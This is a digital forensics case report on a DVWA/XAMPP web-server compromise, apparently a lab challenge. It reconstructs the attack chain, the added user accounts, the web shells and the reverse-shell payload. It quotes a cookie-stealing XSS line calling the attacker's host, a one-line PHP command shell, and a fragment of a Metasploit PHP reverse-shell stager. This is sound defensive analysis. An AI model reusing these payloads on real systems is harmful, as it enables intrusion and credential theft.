# Digital Forensics Case Report — ALIHADI-C1-R3 (Challenge #1: Web Server Case)

Examiner: Halil Ozturkci · Swarm `sf4b2` · assembled by critic/editor `sf4b206`

Evidence: `inputs/s4a-challenge4` (25 GB raw NTFS disk image, SHA-256 `a584de7f06bc…`)
and `inputs/memdump.mem` (1 GB RAM image, SHA-256 `ce6af78989ff`). `inputs/` was left
byte-for-byte unchanged.

Summary of the box: Windows Server 2008 SP1 **x86 (32-bit, PAE)** (`NTBuildLab 6001.18000`,
`NtProductType Server`), running the **XAMPP 5.6.11-1** web stack (Apache httpd, MySQL,
PHP, phpMyAdmin, FileZilla FTP Server) with the deliberately vulnerable web app
**DVWA v1.3** in `C:\xampp\htdocs\DVWA`. Memory captured `2015-09-03 10:04:05 UTC`.

---

## 1. Type of attacks performed on the box

A **web-application attack against the Damn Vulnerable Web Application (DVWA v1.3)**,
launched by a remote host at **`192.168.56.102`** (Kali Linux) against the web server
at **`192.168.56.101`**. The attacker chained several DVWA vulnerabilities into
unauthenticated-to-authenticated access and ultimately **remote code execution (RCE)**:

| Stage | Technique | Evidence |
| --- | --- | --- |
| Recon / login | Brute-force of `/dvwa/login.php` (4 POSTs, `Firefox/38.0 Iceweasel/38.2.0` UA) | `access.log` inode `59684` |
| Reflected XSS | Cookie-stealing payload `document.location='http://192.168.56.102/?'+document.cookie` on `/vulnerabilities/xss_r/` | `access.log` inode `59684` |
| CSRF | Password-change requests on `/vulnerabilities/csrf/` | `access.log` inode `59684` |
| LFI | Path traversal on `/vulnerabilities/fi/` to read `hosts`, `data.txt`, `phpMyAdmin/config.inc.php`, etc. | `access.log` + `php_error_log` `include()` warnings |
| SQL injection | Manual `id=… UNION SELECT version()/user()/database()`, then **automated with `sqlmap/1.0-dev-nongit-20150902`** (~2240 requests) | `access.log` inode `59684` |
| SQLi → file write | `INTO OUTFILE` to drop PHP shells `tmpukudk.php` / `tmpbiwuc.php` / `tmpudvfh.php` / `tmpbrjvl.php`, then command execution + deletion | `access.log` (`sed -n '7595,7665p'`) |
| OS command injection | POSTs to `/vulnerabilities/exec/` used to run OS commands (account creation — see §2) | `access.log` inode `59684` |
| Unrestricted file upload | Upload of `phpshell.php`, `c99.php`, `webshell.php`, `phpshell2.php` via `/vulnerabilities/upload/` | `access.log` + `timeline.csv` |

The result was a full-featured interactive web shell (`c99.php`) and a Metasploit PHP
meterpreter reverse shell (`phpshell2.php`) — see §5.

**Evidence paths:** `catalog/s4a-challenge4/p2048/filelist.txt`,
`catalog/s4a-challenge4/p2048/timeline.csv`, Apache `access.log` (inode `59684`,
extracted `work/sf4b203/extracted/access.log`), `work/sf4b203/extracted/error.log`,
`work/sf4b203/extracted/php_error_log`.

---

## 2. How many users the attacker added, and how

**Two local user accounts were added** to the machine:

| Account | RID | SAM last-write (UTC) | Evidence |
| --- | --- | --- | --- |
| `user1` | `1005` | `2015-09-02T09:05:06Z` | `SAM\Domains\Account\Users\Names\user1` + `Users\000003ED` |
| `hacker` | `1006` | `2015-09-02T09:05:25Z` | `SAM\Domains\Account\Users\Names\hacker` + `Users\000003EE` |

Both new SIDs (`…-1005`, `…-1006`) were added to the local **`Remote Desktop Users`**
alias (alias key last-write `2015-09-02T09:19:24Z`), and the `Users` alias was updated
at `2015-09-02T09:05:25Z`.

**How they were added:** through **DVWA OS command injection** (`/dvwa/vulnerabilities/exec/`)
from `192.168.56.102`, most likely with `net user … /add` and `net localgroup "Remote Desktop
Users" … /add`. The supporting evidence:

- Apache `access.log` shows POSTs to `/dvwa/vulnerabilities/exec/` at `2015-09-02T09:05:22Z`
  and `2015-09-02T09:19:21Z` — within seconds of the SAM account writes and **three seconds
  before** the Remote Desktop Users alias change (`09:19:24Z`).
- Apache `error.log` preserves the output of **three failed `net user /add` attempts**
  (`"The password does not meet the password policy requirements… NET HELPMSG 2245"`),
  directly proving `net user /add` was the tool used.
- No `4720`/`4732` Security audit records were present (Security.evtx), and no Prefetch
  artifacts exist on disk — so the proof is the SAM hive + log correlation, not explicit
  audit events.

Note (detail for §8): the attacker added the accounts to `Remote Desktop Users`, but the
extracted SYSTEM hive still has `Terminal Server\fDenyTSConnections=1`, so inbound RDP was
not actually enabled — a persistence step that was prepared but not completed.

**Evidence paths:** `work/sf4b201/hives/SAM` (extracted from inode `18491-128-3`),
`work/sf4b201/hives/SYSTEM` (inode `18499-128-3`), `work/sf4b203/extracted/access.log`,
`work/sf4b203/extracted/error.log`, `work/sf4b201/evtx/Security.evtx` (inode `42093-128-4`).

---

## 3. Leftovers the attacker left behind

The attacker did **not** clean up. Preserved artifacts (all in the DVWA web root unless noted):

| Artifact | Path (inode) | SHA-256 / content |
| --- | --- | --- |
| One-line command shell | `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` (62330) | `08245eeb54a5d973b20a82e03d82556a693f5c63310e01a2f492b78dda132a99` — `<?php system($_GET["cmd"]); ?>` |
| Shell archive | `xampp/htdocs/DVWA/webshells.zip` (62331) | `bdae3070d4d9a483a8f08db4d16c9100723dea6fba3a7e53cbf249851bad99ee` — contains `c99.php` + `webshell.php` |
| Staging dir | `xampp/htdocs/DVWA/webshells/` (62332) | directory |
| Full web shell | `xampp/htdocs/DVWA/c99.php` (62333) | `4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c` — c99 shell v1.0 beta |
| One-line command shell | `xampp/htdocs/DVWA/webshell.php` (62334) | `794f25b47b4773f6749b0f607f906e5181545eca7835a927c9a197c94c3fd74b` — `<?php system($_GET["cmd"]); ?>` |
| Attacker-made dir | `xampp/htdocs/DVWA/hackable/uploads/abc/` (62335) | created via `phpshell.php?cmd=mkdir abc` |
| Reverse-shell stager | `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` (62337) | `2e77d2db6ffba49be0ccf3850ee23de61b289d1e2dfee5b79e4d04563c42a1f7` — Metasploit `php/meterpreter_reverse_tcp` → `192.168.56.102:4545` |

Also recovered from logs / deleted entries:

- **Transient sqlmap shells** (created then deleted, visible only in `access.log`):
  `xampp/htdocs/tmpukudk.php`, `xampp/htdocs/tmpbiwuc.php` (2015-09-02 ~11:25Z),
  `xampp/htdocs/tmpudvfh.php`, `xampp/htdocs/tmpbrjvl.php` (2015-09-03 ~06:52Z) —
  written via `INTO OUTFILE` SQL injection.
- **Deleted second c99 copy**: `Users/Administrator/AppData/Local/Temp/c99 (2).php`
  (deleted, inode `62338`, 153,275 bytes) — filename/timeline evidence only.
- **`Users/Administrator/data.txt`** (inode `60464`, content `hello`) — command-execution
  test file (medium confidence).

**Not attacker tooling:** `Users/Administrator/AppData/Local/Temp/ad_driver.sys` (inode
`60402`, SHA-256 `11a707d5115e55649fb1964cda455a1f74c21c4877f745ed225b961f5acdf2f8`) is
the **AccessData FTK Imager** memory-acquisition driver (Company "AccessData Corporation"),
dropped by the investigator at capture time (`2015-09-03 10:04:05Z`).

No attacker-named scheduled tasks, no Prefetch entries, and no dropped service binaries
were found.

**Evidence paths:** `catalog/s4a-challenge4/p2048/filelist.txt`,
`catalog/s4a-challenge4/p2048/timeline.csv`, `work/sf4b203/extracted/*`.

---

## 4. Software installed on the box, and whether the attacker installed it

Full software inventory (HKLM Uninstall keys, `SYSTEM\ControlSet001\Services`, disk inodes):

| Software | Version | Installed (UTC) | Installed by attacker? |
| --- | --- | --- | --- |
| Windows Server 2008 SP1 (base OS) | NT 6.0 build 6001 x86 | 2008-01-19 (image baseline) | No |
| .NET Framework 3.0/3.5 + IIS (WAS/AppHostSvc/InetInfo/ASP.NET) | — | 2015-08-23 21:25–21:26 | No (web-server setup) |
| Microsoft Visual C++ 2008 Redistributable x86 | 9.0.21022 | 2015-08-23 21:43:54 | No (XAMPP dependency) |
| **XAMPP** (Apache/MySQL/PHP/phpMyAdmin/FileZillaFTP/MercuryMail/Tomcat/Perl) | 5.6.11-1 (Bitnami) | 2015-08-23 21:44:08 | No (company web stack) |
| **DVWA** (Damn Vulnerable Web Application) | v1.3 | 2015-08-23 21:52:25 | No (pre-existing, later exploited) |
| Oracle VM VirtualBox Guest Additions | 4.3.30.0 | 2015-08-24 07:14:15 | No (VM tooling) |
| AccessData FTK Imager (`ad_driver.sys`) | 2.13.0.0 | 2015-09-03 10:04:05 | No (investigator acquisition) |

**Conclusion: the attacker installed no software.** Every non-Microsoft install predates
the attack window (2015-09-02/03) or is investigator tooling. No new Uninstall entry, no
new service, and no new driver appear in the attack window. The attacker exploited the
pre-existing vulnerable DVWA app and re-used the XAMPP-bundled stack (Apache/PHP/FileZilla)
— their "leftovers" are web-shell files, not installed programs.

**Evidence paths:** `work/sf4b205/SOFTWARE`, `work/sf4b205/SYSTEM` (regipy),
`catalog/s4a-challenge4/p2048/timeline.csv`, `work/sf4b205/` (installer inode hashes).

---

## 5. Type of shellcode used (memory forensics)

The attacker's "shellcode" is the **Metasploit `php/meterpreter_reverse_tcp`** payload — an
**interpreted PHP reverse-shell stager**, not native x86 shellcode.

`phpshell2.php` (inode `62337`, SHA-256 `2e77d2db…c42a1f7`) is byte-for-byte the classic
Metasploit stager:

```
$ip = '192.168.56.102'; $port = 4545;
… stream_socket_client / fsockopen / socket_create …
$len = fread($s, 4); … while (strlen($b) < $len) { $b .= fread($s, …); }
eval($b);
```

It reconnects out to the attacker's handler at **`192.168.56.102:4545`**, receives a
length-prefixed payload, and `eval()`s it (the meterpreter stage) in the PHP runtime —
hence no native PE-injected shellcode is required.

**Memory forensics corroborates this.** Volatility `malfind` did flag RWX
`PAGE_EXECUTE_READWRITE` VADs in `svchost.exe` (PID 1024/1108), `explorer.exe` (816),
`xampp-control.exe` (2768) and `FTK Imager.exe` (2120). Independent disassembly of the
dumps (`work/extracted/memory/malfind/*.dmp`) shows the flagged bytes are a **shared
`VadS` section** containing RPC/thunk glue (`mov al,<idx>; jmp … xor ecx,ecx; mov cl,al;
add ecx,<off>; jmp dword ptr [0x77359d80]`), byte-identical across unrelated processes and
present even in the responder's own `FTK Imager.exe`. The hardcoded pointer `0x77359d80`
resolves inside **RPCRT4.dll** (base `0x772a0000`) to an RPC dispatch thunk at `0x772ee1ff`,
and `windows.threads` shows **no thread start address** inside any flagged VAD. These are
therefore **benign shared RPC/thunk sections (false positives), not injected shellcode**.

Net: the "shellcode" is **PHP meterpreter over a reverse TCP channel**; memory contains no
live native injected shellcode at capture. (Consistent with `netscan`, which shows no
established reverse-shell socket at capture — the stager is a reconnect-on-demand payload.)

**Evidence paths:** `work/sf4b203/extracted/phpshell2.php`,
`catalog/memdump.mem/malfind.txt`, `work/extracted/memory/malfind/*.dmp`,
`work/sf4b206/rpcrt4/pid.1024.vad.0x772a0000-0x77362fff.dmp`,
`catalog/memdump.mem/netscan.txt`, `catalog/memdump.mem/threads` (`work/extracted/memory/threads.txt`).

---

## 6. Timeline analysis

The merged, time-zone-normalized timeline is in **`work/timeline.md`** (63 dated rows;
all times UTC). Key phases:

| Phase | Window (UTC) | Events |
| --- | --- | --- |
| System/stack build | 2015-08-23 21:25–21:52 | .NET/IIS features, VC++ 2008 redist, XAMPP 5.6.11-1, DVWA v1.3 |
| Pre-attack logon noise | 2015-08-23 10:53:26 | 4× failed NTLM logon for `Student` from `10.20.0.118` |
| First contact / brute force | 2015-08-23 22:24 | attacker (`192.168.56.102`) brute-forces DVWA login |
| Web-attack enumeration | 2015-09-01 23:04 → 09-02 | XSS (cookie theft), CSRF, LFI, manual SQLi |
| **Account creation** | 2015-09-02 09:05–09:19 | `user1` + `hacker` created via `exec` command injection; added to `Remote Desktop Users` |
| sqlmap automation | 2015-09-02 11:15–11:25 | `sqlmap` floods (2240 reqs); `INTO OUTFILE` transient shells |
| More sqlmap shells | 2015-09-03 06:52 | second `INTO OUTFILE` cycle (`tmpudvfh.php`/`tmpbrjvl.php`) |
| **Web-shell phase** | 2015-09-03 07:10–07:31 | upload `phpshell.php`, `webshells.zip`→`c99.php`+`webshell.php`, `mkdir abc`, `net user /add` failures, `phpshell2.php` |
| Acquisition | 2015-09-03 10:03:37–10:04:05 | `FTK Imager.exe` launched; `ad_driver.sys` dropped; memory captured |

**Evidence:** `work/timeline.md` (generated from `ledger/ledger.md` by sf4b204), backed by
`catalog/s4a-challenge4/p2048/timeline.csv`, `access.log`, `php_error_log`, `error.log`,
SAM/SYSTEM hives, and memory catalog.

---

## 7. Hypothesis and approach

**Hypothesis.** An attacker operating a Kali Linux host at `192.168.56.102` (Iceweasel
38.2 + sqlmap 1.0-dev) targeted the company web server (`192.168.56.101`) running a
publicly reachable, deliberately vulnerable DVWA v1.3 on XAMPP. Over two sessions they
(a) brute-forced the DVWA login, (b) exercised the lab's own vulnerabilities (reflected XSS
for cookie theft, CSRF, LFI, SQL injection), (c) pivoted to **OS command injection** to add
two local accounts (`user1`, `hacker`) and place them in the `Remote Desktop Users` group,
(d) used **sqlmap `INTO OUTFILE`** and the **unrestricted upload** to drop interactive web
shells (`c99.php`, one-line `system($_GET["cmd"])` shells), and finally (e) deployed a
**Metasploit PHP meterpreter reverse shell** (`phpshell2.php` → `192.168.56.102:4545`) for
persistent control. The goal appears to be web-server compromise with credential/persistence
grooming (RDP-oriented) rather than mass malware deployment — no attacker-installed software
and no native shellcode were left resident.

**Approach to solving it.** (1) Triangulate disk and memory evidence and normalize every
timestamp to UTC; (2) enumerate the NTFS file list and MAC timeline to isolate the attack
window and the bonus attacker-added paths; (3) parse SAM/SYSTEM/SECURITY + Security.evtx for
account/group changes; (4) mine Apache `access.log`/`error.log` and `php_error_log` to
reconstruct the HTTP kill-chain; (5) run Volatility 3 over the RAM image for processes,
network, and injection evidence; (6) hash every extracted artifact; (7) merge everything into
a single ledger-backed timeline and cross-verify every citation before writing this report.

**Evidence:** the entire `ledger/ledger.md` (67 entries) and the cited catalogs/extracts.

---

## 8. Anything else

- **Time normalization is essential:** disk MAC + memory capture are UTC; Apache logs are
  `-0700` (PDT); PHP logs are `Europe/Berlin` (UTC+2); memory `pslist` CreateTimes show a
  ~10h RTC skew around boot (VBoxService time sync). Everything here is UTC.
- **RDP was prepared but not enabled:** the new users were added to `Remote Desktop Users`,
  but `Terminal Server\fDenyTSConnections=1` means inbound RDP remained off.
- **`ad_driver.sys` / FTK Imager is investigator tooling**, not attacker malware (AccessData
  driver dropped at the exact capture instant; FTK Imager launched from a VirtualBox shared
  folder at 10:03:37Z).
- **No scheduled tasks, Prefetch entries, or attacker services/drivers** were found — the
  attacker relied on web shells and the reverse shell, not OS-level persistence.
- The only pre-attack unrelated event is a small cluster of failed NTLM logons for `Student`
  from `10.20.0.118` (2015-08-23), not tied to the DVWA attacker.

---

## Bonus — directories and files added by the attacker (with proof)

High-confidence attacker-added paths, each with inode + timeline + (where applicable)
access-log correlation and content hash:

| # | Path | Inode | First visible (UTC) | Proof |
| --- | --- | --- | --- | --- |
| 1 | `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | `62330-128-3` | `2015-09-03T07:10:15Z` | `filelist.txt`; `timeline.csv`; `icat … 62330` = `system($_GET["cmd"])`; `access.log` `00:10:15 -0700` upload POST |
| 2 | `xampp/htdocs/DVWA/webshells.zip` | `62331-128-1` | `2015-09-03T07:14:48Z` | `filelist.txt`; `timeline.csv`; `icat … 62331` → zip containing `c99.php`+`webshell.php` |
| 3 | `xampp/htdocs/DVWA/webshells/` | `62332-144-1` | `2015-09-03T07:14:51Z` | `filelist.txt`; `timeline.csv` |
| 4 | `xampp/htdocs/DVWA/webshell.php` | `62334-128-1` | `2015-09-03T07:14:57Z` | `filelist.txt`; `timeline.csv`; `icat … 62334` = `system($_GET["cmd"])` |
| 5 | `xampp/htdocs/DVWA/hackable/uploads/abc/` | `62335-144-1` | `2015-09-03T07:17:58Z` | `filelist.txt`; `timeline.csv`; `access.log` `?cmd=mkdir abc` |
| 6 | `xampp/htdocs/DVWA/c99.php` | `62333-128-3` | `2015-09-03T07:20:45Z` | `filelist.txt`; `timeline.csv`; `icat … 62333` = c99 shell; `access.log` `/dvwa/c99.php` |
| 7 | `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | `62337-128-4` | `2015-09-03T07:31:30Z` | `filelist.txt`; `timeline.csv`; `icat … 62337` = meterpreter stager; `access.log` upload + GET |

Log-only (transient, created then deleted by the attacker; no inode persists in the final
file list, but preserved in `access.log`):

- `xampp/htdocs/tmpukudk.php`, `xampp/htdocs/tmpbiwuc.php`
- `xampp/htdocs/tmpudvfh.php`, `xampp/htdocs/tmpbrjvl.php`

Deleted-then-recovered-by-filename:

- `Users/Administrator/AppData/Local/Temp/c99 (2).php` (deleted MFT entry `62338`)

Lower-confidence (corroborating but not included in the headline list):

- `Users/Administrator/data.txt` (inode `60464`, content `hello`; command-execution test).

**Evidence:** `catalog/s4a-challenge4/p2048/filelist.txt`,
`catalog/s4a-challenge4/p2048/timeline.csv`, `icat -o 2048 inputs/s4a-challenge4 <inode>`,
`work/sf4b203/extracted/access.log`.
